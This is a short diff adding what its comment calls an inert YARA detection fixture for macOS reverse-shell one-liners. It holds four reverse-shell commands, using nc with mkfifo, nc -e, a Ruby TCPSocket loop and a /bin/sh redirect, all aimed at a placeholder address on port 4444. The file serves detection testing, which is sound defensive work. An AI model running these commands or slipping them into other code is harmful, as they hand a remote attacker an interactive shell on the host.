@@ -1,0 +1,6 @@
+# Inert YARA fixture for CERBER_MacOS_Reverse_Shell_Oneliners - text only, not a working sample.
+#!/bin/sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
+nc 192.0.2.10 4444 -e /bin/sh
+ruby -rsocket -e'exit if fork;c=TCPSocket.new("192.0.2.10","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
